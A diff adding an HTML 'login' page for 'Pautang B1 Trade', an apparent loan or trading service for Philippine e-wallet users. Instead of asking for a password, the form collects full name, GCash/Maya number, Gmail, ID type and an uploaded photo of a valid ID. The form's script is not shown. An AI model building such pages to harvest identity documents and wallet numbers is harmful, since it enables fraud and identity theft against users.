@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pautang B1 Trade - Login</title>
+<link rel="stylesheet" href="style.css">
+<script defer src="script.js"></script>
+</head>
+<body>
+<div class="falling-bg"></div>
+<div class="login-container">
+  <h1>Pautang B1 Trade</h1>
+  <p>OPEN TO ANY WALLET (GCASH / MAYA / GOTYME)</p>
+  <form id="loginForm">
+    <input type="text" id="firstName" placeholder="First Name" required>
+    <input type="text" id="lastName" placeholder="Last Name" required>
+    <input type="text" id="number" placeholder="GCASH / MAYA Number" pattern="\d{11}" required>
+    <input type="email" id="email" placeholder="Gmail" required>
+    <input type="text" id="idType" placeholder="Philippines ID Type (ex. Driver’s License)" required>
+    <label>Valid ID: <input type="file" id="validID" accept="image/*" required></label>
+    <label><input type="checkbox" id="remember"> Remember me (Android/iOS)</label>
+    <button type="submit">Login</button>
+  </form>
+</div>
+</body>
+</html>
